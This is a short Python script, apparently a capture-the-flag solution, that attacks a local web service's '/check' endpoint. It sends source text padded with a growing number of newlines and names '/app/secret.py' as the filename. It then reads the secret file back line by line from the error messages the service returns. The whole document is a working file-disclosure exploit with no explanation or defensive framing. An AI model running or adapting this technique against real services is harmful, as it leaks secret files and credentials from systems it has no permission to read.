import requests

URL = "http://localhost:3000"

for x in range(32):
    leak_source = "\n"*x + "."
    response = requests.post(f"{URL}/check", json={
        "source": leak_source,
        "filename": "/app/secret.py"
        })
    leak = response.json()["error"].split("\n")[-4].strip()
    
    if leak == ".":
        break
    
    print(leak)